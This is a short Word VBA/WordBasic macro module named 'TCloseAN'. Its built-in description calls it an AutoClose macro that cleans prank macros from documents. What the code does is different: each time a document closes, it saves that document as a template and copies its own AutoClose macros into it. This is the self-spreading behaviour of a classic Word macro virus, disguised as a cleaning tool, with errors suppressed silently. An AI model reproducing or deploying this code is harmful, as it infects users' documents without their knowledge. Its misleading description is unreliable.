Attribute VB_Name = "TCloseAN"

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TCloseAN.MAIN"
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
WordBasic.FileSaveAs Format:=1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "DCloseAN", sTMacro$
sTMacro$ = sMe$ + ":TCloseAN"
WordBasic.MacroCopy "AutoClose", sTMacro$
WordBasic.FileSave
Bail:
End Sub
